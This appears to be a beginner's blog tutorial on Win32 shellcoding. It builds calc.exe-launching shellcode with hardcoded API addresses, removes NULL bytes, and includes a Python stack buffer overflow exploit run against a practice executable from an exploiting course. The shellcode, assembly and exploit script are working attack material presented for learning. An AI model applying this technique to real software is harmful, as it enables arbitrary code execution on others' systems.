# Win32 Hardcoded Shellcode

## Introduction

Today I will cover a topic that has always stretched my mind : Shellcoding.

Let me warn you that this guide is for utmost beginners, and by no means will this shellcode work in any modern environment. Nevertheless, I think it is good to build the basics correctly and that is my goal with this post.

The post will consits of showing you how to generate some shellcode, what issues we can find along the way, and how to trigger it by exploiting a [buffer overflow vulnerability](https://0xpxt.github.io//Buffer-Overflow-Basics/).

I hope you enjoy it!

## Generating the shellcode

Our shellcode will be expressed in hexadecimal, but we can write it in C, then compile it and finally extract the bytes equivalent to the assembly opcodes and operands that we obtain.

Let‚Äôs get our hands dirty, first we can code up a super simple program which will call the Windows API to execute the notepad :

You really don‚Äôt have to be a genius to understand what `WinExec` and `ExitProcess` do, but here is the documentation just in case you want to check those out :

[https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec)

[https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess)

To compile this code, I will use the cross-compiler MinGW, but any compiler will do.

```bash
i686-w64-mingw32-gcc exec_calc_win.c -o exec_calc_win.exe
```

If I move that to my Windows 10 VM and execute it ‚Ä¶

I promise it works, I did not open `calc.exe` by double clicking‚Ä¶

Alright, we have our compiled code to execute the calculator application, but how do we translate this to some shellcode? 

Be patient young rusher, that is the next point we are going to cover. 

By opening up the binary with a hex editor, we can see the raw bytes that the file consists of. 

![Untitled](Win32%20Hardcoded%20Shellcode%208c431330619e421ba80f3f998b551f50/Untitled%202.png)

I am using HxD on my Windows VM, but feel free to use any of your liking.

From here, we can either parse the PE file and find the .text section (see [the previous post](https://0xpxt.github.io//The-Portable-Executable-Format/)) which contains the code, or we can be a little more practical and throw the binary into a disassembler, which will tell us where the instructions begin :

![Untitled.png](Win32%20Hardcoded%20Shellcode%208c431330619e421ba80f3f998b551f50/Untitled%203.png)

As we can see, the program‚Äôs main starts at address 0x00401530, let‚Äôs find out where it ends :

![Untitled](Win32%20Hardcoded%20Shellcode%208c431330619e421ba80f3f998b551f50/Untitled%204.png)

Looks like we can get all these bytes now from our hex editor!

Let‚Äôs just find them with a search command (Ctrl+F in HxD).

![Untitled](Win32%20Hardcoded%20Shellcode%208c431330619e421ba80f3f998b551f50/Untitled%205.png)

And here we get the result. We know we need the bytes from `8D 4C 24` to `90 90 90`, so let‚Äôs just copy them :

![Untitled](Win32%20Hardcoded%20Shellcode%208c431330619e421ba80f3f998b551f50/Untitled%206.png)

```bash
8D 4C 24 04 83 E4 F0 FF 71 FC 55 89 E5 51 83 EC 14 E8 CA 00 00 00 C7 44 24 04 00 00 00 00 C7 04 24 00 40 40 00 A1 48 61 40 00 FF D0 83 EC 08 C7 04 24 00 00 00 00 A1 00 61 40 00 FF D0 90 90 90
```

There is an issue here that we have not taken into account : the shellcode cannot contain NULL bytes. Why? Because since we will use it to overflow a buffer, the compiler will interpret our shellcode as a string terminator, and will finish running the code at the first NULL byte.

There are techniques to convert shellcode that contains `0x00` bytes to shellcode that doesn‚Äôt, but since we want to play around a little bit, let‚Äôs generate the shellcode a different way!

In the end, we know that we want to call `WinExec` with *‚Äúcalc.exe‚Äù* as the argument, so why not just code it in assembly?

```bash
xor ebx, ebx          ; set ebx to 0x00
push ebx              ; push 0x00 to stack (String terminator for "calc.exe")
push 0x6578652e       ; "exe."
push 0x636c6163       ; "calc"

mov  eax, esp         ; save pointer to "calc.exe" string in eax

; WinExec
inc  ebx              ; WinExec()'s 2nd argument set to 0x01
push ebx              ; push the argument to stack
push eax              ; push "calc.exe"
mov  ebx, 0x7674E120  ; move &WinExec to ebx
call ebx              ; call WinExec("calc.exe", 0)

; ExitProcess
xor  eax, eax         ; set eax to 0x00
push eax              ; push NULL
mov  eax, 0x767158B0  ; move &ExitProcess to eax
jmp  eax              ; jump to it
```

Your question here should be : How the hell do we know `WinExec`'s address? Well, just run this program :

![Untitled](Win32%20Hardcoded%20Shellcode%208c431330619e421ba80f3f998b551f50/Untitled%207.png)

Isn‚Äôt it easy? üòâ

![Untitled](Win32%20Hardcoded%20Shellcode%208c431330619e421ba80f3f998b551f50/Untitled%208.png)

You can do the same for `ExitProcess`.

Once we have reached this point, in order to compile our code and get the raw hex bytes, we need to give it a little more form :

```
; nasm -f elf32 -o example1.o example1.asm
; ld -m elf_i386 -o example1 example1.o

section .data

section .bss

section .text
  global _start   ; must be declared for linker

_start:
xor ebx, ebx          ; set ebx to 0x00
push ebx              ; push 0x00 to stack (String terminator for "calc.exe")
push 0x6578652e       ; "exe."
push 0x636c6163       ; "calc"

mov  eax, esp         ; save pointer to "calc.exe" string in eax

; WinExec
inc  ebx              ; WinExec()'s 2nd argument set to 0x01
push ebx              ; push the argument to stack
push eax              ; push "calc.exe"
mov  ebx, 0x7674E120  ; move &WinExec to ebx
call ebx              ; call WinExec("calc.exe", 0)

; ExitProcess
xor  eax, eax         ; set eax to 0x00
push eax              ; push NULL
mov  eax, 0x767158B0  ; move &ExitProcess to eax
jmp  eax              ; jump to it
```

Let‚Äôs check the bytes we are looking for :

![Untitled](Win32%20Hardcoded%20Shellcode%208c431330619e421ba80f3f998b551f50/Untitled%209.png)

Which once again I will copy from HxD :

![Untitled](Win32%20Hardcoded%20Shellcode%208c431330619e421ba80f3f998b551f50/Untitled%2010.png)

```bash
31 DB 53 68 2E 65 78 65 68 63 61 6C 63 89 E0 43 53 50 BB 20 E1 74 76 FF D3 31 C0 50 B8 B0 58 71 76 FF E0
```

No NULL bytes! Now we can inject this with nothing to worry about.

## Buffer overflow exploitation

Now the really cool stuff happens. We will exploit a basic buffer overflow and overwrite the return address with a pointer to our shellcode.

The vulnerable code that I will be using is a slightly modified exercise I have got from [this wonderful free course](http://ricardonarvaja.info/WEB/EXPLOITING%20Y%20REVERSING%20USANDO%20HERRAMIENTAS%20FREE/) (Please check it out, I guarantee you will not be disappointed) :

![Untitled](Win32%20Hardcoded%20Shellcode%208c431330619e421ba80f3f998b551f50/Untitled%2011.png)

Since the goal of this post is to show how we can execute our shellcode I will not be covering how I am overwriting the return address, but any quick search on that will find you what you want.

And here is the exploit I will be using : 

```python
import sys
from subprocess import Popen, PIPE
import struct
import codecs

decode_hex = codecs.getdecoder("hex_codec")

shellcode = '31DB53682E6578656863616C6389E0435350BB20E17476FFD331C050B8B0587176FFE0'

# We want it to be in format \xe0\xff\x76...
winexec_calc_shellcode = decode_hex(shellcode)[0]

# Payload = shellcode + padding + address of buf[1024]
payload = winexec_calc_shellcode + b"A" * (0x404 - len(winexec_calc_shellcode)) + struct.pack("<L",0x4025b4)

# Open the vulnerable file
p1 = Popen(r"C:\Users\Exploiting\Desktop\Curso Exploiting\STACKS-20230323T211310Z-001\ABOS\ABO1_VS_2017.exe", stdin=PIPE)

# Send the payload
p1.communicate(payload)
```

As you can see, the exploit will run the vulnerable executable and execute the calculator through a buffer overflow.

What is happening in here is that we have overflown the buffer by filling it with our shellcode and some padding until we have found the return address, this return address is overwritten with the address of the buffer, so that `eip` points to our shellcode when returning from the function.

This essentially means that when `f` returns, our payload will be executed :

## Conclusion

What a fun post this has been, hasn‚Äôt it? I hope you appreciated it because it took some extra time to prepare.

What you should take from this post is that when there exists a vulnerability of such high risk, an attacker can execute anything they want, be it the windows calculator or maybe something more malicious (the likelihood of the latter is way higher).

Thank you for reading this and have an awesome day!
